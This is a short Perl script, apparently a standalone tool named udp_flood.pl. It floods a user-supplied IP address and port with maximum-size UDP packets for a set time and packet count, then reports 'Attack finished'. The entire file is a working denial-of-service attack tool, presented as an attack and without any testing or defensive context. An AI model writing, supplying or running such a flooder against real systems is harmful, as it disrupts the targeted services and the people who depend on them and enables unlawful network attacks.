use IO::Socket;

my $ip = shift || die "Usage: perl udp_flood.pl <IP> <PORT> <TIME> <NUM_PACKETS>\n";
my $port = shift || die "Usage: perl udp_flood.pl <IP> <PORT> <TIME> <NUM_PACKETS>\n";
my $time = shift || die "Usage: perl udp_flood.pl <IP> <PORT> <TIME> <NUM_PACKETS>\n";
my $num_packets = shift || die "Usage: perl udp_flood.pl <IP> <PORT> <TIME> <NUM_PACKETS>\n";

print "UDP Flooding $ip:$port for $time seconds with $num_packets packets\n";

my ($iaddr, $proto, $paddr, $timeout);

$iaddr = inet_aton("$ip");
$proto = getprotobyname("udp");
$paddr = sockaddr_in($port, $iaddr);

$timeout = time() + $time;

socket(SOCKET, PF_INET, SOCK_DGRAM, $proto);

for (my $i = 0; $i < $num_packets; $i++) {
    last if time() > $timeout;
    send(SOCKET, pack("a65507", "A" x 65507), 0, $paddr);
}

close(SOCKET);

print "Attack finished\n";